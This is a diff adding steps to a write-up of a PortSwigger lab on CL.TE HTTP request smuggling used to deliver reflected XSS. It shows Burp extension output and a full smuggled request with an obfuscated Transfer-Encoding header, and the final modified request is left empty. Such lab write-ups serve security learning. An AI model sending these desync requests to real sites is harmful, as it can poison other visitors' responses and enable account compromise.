@@ -10,12 +10,73 @@ If the front-end and back-end servers behave differently in relation to the (pos
 1. TE-TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way
 #### Lab enviroment
 In the lab the front-end server doesn't support chunked encoding. The application is also vulnerable to reflected XSS via the User-Agent header.
+To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes <b>alert(1)</b><br><i>Note: you must have HTTP Request Smuggler extention installed in Burp</i>
+#### Steps
+First we need to verify if the application is vulnerable to HTTP request smuggling (AKA desync attack), so lets proceed to analyze the request for a comment subsmission. 
+First verify that the HTPP request smuggler extension is installed: click to Extension (1), then verify that the Smuggler is listed (2), eventually go BApp Store (3) and proceed to the installation. I suggest to set the Output (4) to Save to a file
+-- 64 --
+In the output we will get the report with the results of the externsion's execution.
 
-To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes <b>alert(1)</b>
+Now lets proceed to use the HTTP Request Smuggler, to do that right-click into the Request body and choose Smuggle probe:
+-- 65 --
+Wait a couple of minute (or tail the file) to get the result that indicates that the application could be prone to CL-TE desyn vulnerability:
+```
+Updating active thread pool size to 8
+Loop 0
+Queued 1 attacks from 1 requests in 0 seconds
+Unexpected report with response
+Found issue: Possible HTTP Request Smuggling: CL.TE multiCase (delayed response)
+Target: https://0a57004604fdbb11c0900dc7003c00ec.web-security-academy.net
+Burp issued a request, and got a response. Burp then issued the same request, but with a shorter Content-Length, and got a timeout.<br/> 
+This suggests that the front-end system is using the Content-Length header, and the backend is using the Transfer-Encoding: chunked header. 
+You should be able to manually verify this using the Repeater, provided you uncheck the 'Update Content-Length' setting on the top menu. 
+<br/>As such, it may be vulnerable to HTTP Desync attacks, aka Request Smuggling. 
+<br/>To attempt an actual Desync attack, right click on the attached request and choose 'Desync attack'. 
+Please note that this is not risk-free - other genuine visitors to the site may be affected.<br/>
+...
+```
+As suggested we should be able to manually test the vulnerability using a payload provided in the report. Scrolling the result we can choose the following:
+```
+...
+POST /post/comment HTTP/1.1
+Host: 0a57004604fdbb11c0900dc7003c00ec.web-security-academy.net
+Cookie: session=MbuQ0HO3BxnXptLaE7AxSCZXPfSvpRN9
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 360
+Origin: https://0a57004604fdbb11c0900dc7003c00ec.web-security-academy.net
+Referer: https://0a57004604fdbb11c0900dc7003c00ec.web-security-academy.net/post?postId=6
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+tRANSFER-ENCODING: chunked
+
+d9
+csrf=p4zKeCvcLDslONzQNKUADCmRI35esBS7&userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A108.0%29+Gecko%2F20100101+Firefox%2F108.0&postId=6&comment=Ehi+ciao&name=filo&email=fiber%40outlook.com&website=
+0
+
+GET /?x=5u0ddwptlhzwzk0kkdjae3bt9kfc31/0a57004604fdbb11c0900dc7003c00ec.web-security-academy.net HTTP/1.1
+Host: 52.16.21.24
+Foo: x
+...
+```
+Copy and paste the request into Reapeter, morover I modified the GET as follows:
+```
+
+```
+    
 
 
 
 #### Reference
 + https://portswigger.net/web-security/request-smuggling
++ https://portswigger.net/web-security/request-smuggling/finding
 + https://portswigger.net/web-security/request-smuggling/exploiting
 
